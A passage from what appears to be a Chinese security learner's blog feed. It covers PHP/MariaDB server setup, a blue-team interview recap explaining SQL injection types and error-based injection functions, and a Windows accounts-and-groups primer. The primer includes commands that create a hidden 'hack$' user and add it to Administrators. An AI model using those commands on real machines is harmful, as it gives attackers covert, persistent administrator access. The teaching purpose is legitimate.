&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-gd-jis-conv \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-gd-native-ttf \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-openssl \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-mhash \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-pcntl \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-sockets \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-xmlrpc \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-zip \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-soap \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-gettext \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--disable-fileinfo \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-opcache \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-pear \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-maintainer-zts \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-ldap=shared \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--without-gdbm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嗯,过程中出现四五次报错,不过问题不大,直接百度就行
成功的话能看到这里&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Generating files
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;configure: creating ./config.status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;creating main/internal_functions.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;creating main/internal_functions_cli.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+--------------------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| License:                                                           |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| This software is subject to the PHP License, available in this     |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| distribution in the file LICENSE.  By continuing this installation |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| process, you are bound by the terms of this license agreement.     |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| If you do not agree with the terms of this license, you must abort |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| the installation process at this point.                            |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+--------------------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Thank you for using PHP.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating php7.spec
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating main/build-defs.h
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating scripts/phpize
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating scripts/man1/phpize.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating scripts/php-config
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating scripts/man1/php-config.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/cli/php.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/php-fpm.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/www.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/init.d.php-fpm
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/php-fpm.service
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/php-fpm.8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/fpm/status.html
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/phpdbg/phpdbg.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating sapi/cgi/php-cgi.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating ext/phar/phar.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating ext/phar/phar.phar.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: creating main/php_config.h
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config.status: executing default commands
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来编译
&lt;code&gt;make &amp;amp;&amp;amp; make install&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp php.ini-development /usr/local/php/etc/php.ini
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /usr/local/php/etc/php-fpm.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 进入文件后找到下面的内容并更改目录
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pid = /usr/local/php/var/run/php-fpm.pid 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /usr/lib/systemd/system/php-fpm.service
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#添加
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Description=The PHP FastCGI Process Manager
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;After=syslog.target network.target
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Type=notify
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PIDFile=/var/opt/remi/php73/run/php-fpm/php-fpm.pid
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ExecStart=/opt/remi/php73/root/usr/sbin/php-fpm --nodaemonize  --fpm-config /etc/opt/remi/php73/php-fpm.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ExecReload=/bin/kill -USR2 $MAINPID
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PrivateTmp=true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意: 需要根据自己环境情况 填写 PIDFile、ExecStart; PIDFile为pid文件, ExecStart 为可执行文件和 php-fpm.conf 配置文件地址&lt;/p&gt;
&lt;p&gt;加个权限：&lt;/p&gt;
&lt;p&gt;chmod +x /etc/init.d/php-fpm&lt;/p&gt;
&lt;p&gt;现在试一下，/etc/init.d/php-fpm start&lt;/p&gt;
&lt;p&gt;systemctl重载
&lt;code&gt; systemctl daemon-reload&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 设置开机自启
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl enable php-fpm.server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 重启php-fpm
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl restart php-fpm.server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 重启后可以查看php-fpm状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl status php-fpm.server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后是安装mysql&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 安装
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y mariadb-server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 启动
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start mariadb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 查看状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl status mariadb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 开机启动
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl  enable  mariadb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 设置密码
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysqladmin -uroot  password  &amp;#39;yourpassword&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/usr/share/nginx/html
/etc/nginx/nginx.conf&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://lnmp.org/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://lnmp.org/install.html&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>第一次面试经历</title>
        <link>https://proben1.github.io/2022/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</link>
        <pubDate>Sun, 10 Apr 2022 09:13:17 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</guid>
        <description>&lt;p&gt;hvv蓝队&lt;/p&gt;
&lt;p&gt;西邮的一个学长，很温柔&lt;/p&gt;
&lt;p&gt;先是看我加入了AD网络安全协会，他说自己是协会的创始人之一，我tm直接借机套一波近乎先，吹了下协会&lt;/p&gt;
&lt;p&gt;然后开始面试&lt;/p&gt;
&lt;p&gt;首先问了下《白帽子》，通过这本书我都了解些什么，我大概说了下安全世界观的事情，安全的本质是信任，扯了扯。第二个问sql注入的流程，分类，流程很简单，就是找个框就开注，遇到过滤fuzz一下，该绕过绕过；&lt;/p&gt;
&lt;p&gt;分类我分了三大类，差不多原话答&lt;/p&gt;
&lt;p&gt;1、按注入点数据类型分类：数字型、字符型
2、按数据传参方式分类：GET注入、POST注入、header头注入（cookie注入、host注入、user-agent注入、referer注入…）
3、按执行效果分类：union注入攻击、Boolean注入攻击-布尔盲注、报错注入攻击、时间注入攻击-时间盲注、堆叠查询注入攻击、二次注入攻击、宽字节注入攻击…&lt;/p&gt;
&lt;p&gt;接下来问了报错注入，我超我记不清，就记得e和u开头的俩函数，就实话实说了，但是等一会又想起来了，有一个updatexml，他问啥是xpath，我说是xml路径。最后他打了个圆场，可能我学太多忘了。&lt;/p&gt;
&lt;p&gt;补充一下&lt;/p&gt;
&lt;p&gt;floor报错注入，利用数据库表主键不能重复的原理，使用GROUP BY分组，产生主键冗余，导致报错&lt;/p&gt;
&lt;p&gt;updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。&lt;/p&gt;
&lt;p&gt;extractvalue() :对XML文档进行查询的函数。
xml文档中查找字符位置是用/xxx/xxx/xxx/&amp;hellip;这种格式，如果写入其他格式就会报错,并且会返回写入的非法格式内容，错误信息如:XPATH syntax error:&amp;lsquo;xxxxxxxx&amp;rsquo;。&lt;/p&gt;
&lt;p&gt;注入接着问，盲注，怎么判断是不是盲注，我说了看回显可以类比成01的bool型还有无回显的时间盲注，接着又问了python脚本跑盲注，这个按自己情况说就可以了。&lt;/p&gt;
&lt;p&gt;接下来是文件上传，大体的上传思路（比如前端），还有对应的中间件解析漏洞，基本都在这两个博客里。
中间件解析漏洞https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html
文件上传https://blog.csdn.net/ouyang_ly/article/details/120210422&lt;/p&gt;
&lt;p&gt;可能是按照我的简历问的，问了怎么加固系统，我说了下可以按照阿里云给的加固方案
&lt;a class=&#34;link&#34; href=&#34;https://www.alibabacloud.com/help/zh/doc-detail/49781.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.alibabacloud.com/help/zh/doc-detail/49781.html&lt;/a&gt;，分成linux和windows，并强调了我在面试前特地准备了一下这个，还没说就问下一条了。&lt;/p&gt;
&lt;p&gt;最后是应急响应怎么做，我的思路是应急响应-&amp;gt;加固-&amp;gt;溯源，先找到具体的那一台机器，然后既然报警那就说明知道了具体的漏洞类型，加相应的补丁打上，以linux为主（一般都会问linux的），查看/var/log/secure系统日志，查看登录失败的记录，还有Linux历史命令&amp;ndash;&amp;gt;home目录的bash_histor，查看执行过的命令。再利用webshell或者是shell查杀工具查杀，查看tmp目录下是非有带有免杀的木马。拿到攻击ip之后开始溯源。
到这里就停了，溯源他没问，面试结束。&lt;/p&gt;
&lt;p&gt;最后问了下我的年级，大二，夸了下年轻有为，我说不算不算，年级里还有比我厉害的。&lt;/p&gt;
&lt;p&gt;我最后也问候了下学长的健康（本来昨天定的面试，结果人家去医院了）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Windows权限基础</title>
        <link>https://proben1.github.io/2022/windows%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Sun, 10 Apr 2022 09:10:24 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/windows%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;h4 id=&#34;用户账户&#34;&gt;用户账户：&lt;/h4&gt;
&lt;p&gt;用户帐户是对计算机用户身份的标识。每个用户包含一个名称和一个密码&lt;/p&gt;
&lt;p&gt;SID：用户帐户拥有唯一的安全标识符&lt;/p&gt;
&lt;p&gt;SAM：本地安全帐户数据库，文件路径：C:\Windows\System32\config\SAM ，进程：lsass.exe&lt;/p&gt;
&lt;p&gt;本地用户和组：为用户和组分配权利和权限，从而限制用户和组执行某些操作的能力。&lt;/p&gt;
&lt;p&gt;一个用户可以在不同的组里，一个组也可以有不同的用户。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;whoami /user   查看系统当前用户的SID&lt;/li&gt;
&lt;li&gt;wmic useraccount get name,sid   查看所有用户的SID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62523004239250f7c5dad75e.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62523004239250f7c5dad75e.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;默认账户&#34;&gt;默认账户&lt;/h4&gt;
&lt;p&gt;**权限：**System &amp;gt; Administrator &amp;gt; User &amp;gt; Guest&lt;/p&gt;
&lt;p&gt;与windows组件关联的用户账户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;System (本地系统)：为windows的核心组件访问文件等资源提供权限；&lt;/li&gt;
&lt;li&gt;Local Service (本地服务)：预设的拥有最小权限的本地账户；&lt;/li&gt;
&lt;li&gt;Network Service (网络服务)：具有运行网络服务权限的计算机账户&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;查看创建和删除账户&#34;&gt;查看、创建和删除账户&lt;/h4&gt;
&lt;p&gt;使用命令查看、创建和删除账户：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;net user　　  查看系统账户&lt;/li&gt;
&lt;li&gt;net user  xie   123  /add    创建新用户xie，密码设置为 123&lt;/li&gt;
&lt;li&gt;net user  hack$ 123 /add    创建隐藏用户hack，密码为123&lt;/li&gt;
&lt;li&gt;net user xie    查看账户xie的属性&lt;/li&gt;
&lt;li&gt;net user xie x456.  将用户写的密码修改为x456.&lt;/li&gt;
&lt;li&gt;net user xie /del  删除用户xie&lt;/li&gt;
&lt;li&gt;net localgroup  administrators xie  /add   将普通用户xie提权到管理员&lt;/li&gt;
&lt;li&gt;net localgroup  administrators hack$ /add  将隐藏用户hack提权到管理员&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户组&#34;&gt;用户组&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Administrators&lt;/li&gt;
&lt;li&gt;Guests&lt;/li&gt;
&lt;li&gt;Power Users&lt;/li&gt;
&lt;li&gt;Users（标准用户）&lt;/li&gt;
&lt;li&gt;Remote Desktop Users&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;administators&lt;/strong&gt; 组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执行整台计算机的管理任务。内置的系统管理员账号 Administrator 就是本地组的成员，而且无法将它从该组删除。如果这台计算机已加入域，则域的Domain Admins 会自动地加入到该计算机的Administrators组内。也就是说，域上的系统管理员在这台计算机上也具备着系统管理员的权限。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guests&lt;/strong&gt; 组是提供给没有用户帐户但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Power Users&lt;/strong&gt; 组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少一些，例如，可以：创建、删除、更改本地用户帐户；创建、删除、管理本地计算机内的共享文件夹与共享打印机；自定义系统设置，例如更改计算机时间、关闭计算机等。但是不可以更改Administrators，无法夺取文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日志。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Users&lt;/strong&gt; 组内的成员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能更改其它用户的数据、不能关闭服务器级的计算机。所有添加的本地用户帐户者自动属于Users组。如果这台计算机已经加入域，则域的Domain Users会自动地被加入到该计算机的Users组中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Remote Desktop Users&lt;/strong&gt; 组内的成员拥有远程桌面登录的权限。默认Administrators组内的成员都拥有远程桌面的权限。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;动态包含成员的内置组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其成员由Windows程序“自动添加” ，Windows会根据用户的状态来决定用户所属的组 ，组内的成员也随之动态变化，无法修改。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;*&lt;strong&gt;Interactive：*&lt;/strong&gt; 动态包含在本地登录的用户；&lt;/li&gt;
&lt;li&gt;*&lt;strong&gt;Authenticated Users*&lt;/strong&gt;：任何一个利用有效的用户帐户连接的用户都属于这个组。建议在设置权限时，尽量针对Authenticated Users组进行设置，而不要针对Everone进行设置。&lt;/li&gt;
&lt;li&gt;*&lt;strong&gt;Everyone*&lt;/strong&gt; ：任何一个用户都属于这个组。注意，如果Guest帐号被启用时，则给Everone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everone组，所以他将具备Everyone所拥有的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;组的查看创建和删除&#34;&gt;组的查看、创建和删除&lt;/h4&gt;
&lt;p&gt;*&lt;strong&gt;使用命令查看、创建和删除组*&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;net localgroup  查看系统的组&lt;/li&gt;
&lt;li&gt;net localgroup  marketGroup  /add     新建一个marketGroup的组&lt;/li&gt;
&lt;li&gt;net localgroup  marketGroup  xie /add  将用户xie加入marketGroup组中&lt;/li&gt;
&lt;li&gt;net localgroup  markGroup   查看markGroup组内的成员&lt;/li&gt;
&lt;li&gt;net localgroup  marketGroup  xie /del  将用户xi从marketGroup组中移除&lt;/li&gt;
&lt;li&gt;net localgroup  marketGroup  /del      删除marketGroup组&lt;/li&gt;
&lt;li&gt;net localgroup &amp;ldquo;remote desktop users&amp;rdquo; hack /add   将用户hack加入远程桌面组&lt;/li&gt;
&lt;li&gt;net localgroup &amp;ldquo;remote desktop users&amp;rdquo; hack /del   将用户hack从远程桌面组删除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6252316c239250f7c5dd0d72.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6252316c239250f7c5dd0d72.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;WDAGUtilityAccount帐户是Windows Defender Application Guard的一部分，它包含在RS3（aka windows 10 fall update）中。&lt;/p&gt;
&lt;p&gt;DefaultAccount用于开机自检阶段。&lt;/p&gt;
&lt;p&gt;BvSsh_VirtualUsers 是设置 BitWise（详见https://www.bitwise.nl/）虚拟用户时，创建的一个用户并将其用作写入文件的安全上下文。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>伪静态注入</title>
        <link>https://proben1.github.io/2022/%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Sat, 26 Mar 2022 18:01:28 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;h3 id=&#34;伪静态注入&#34;&gt;伪静态注入&lt;/h3&gt;
&lt;h4 id=&#34;伪静态网站&#34;&gt;伪静态网站&lt;/h4&gt;
&lt;p&gt;看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互。
将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。&lt;/p&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a/b/c?id=123
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;变成
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a/b/c/id/123
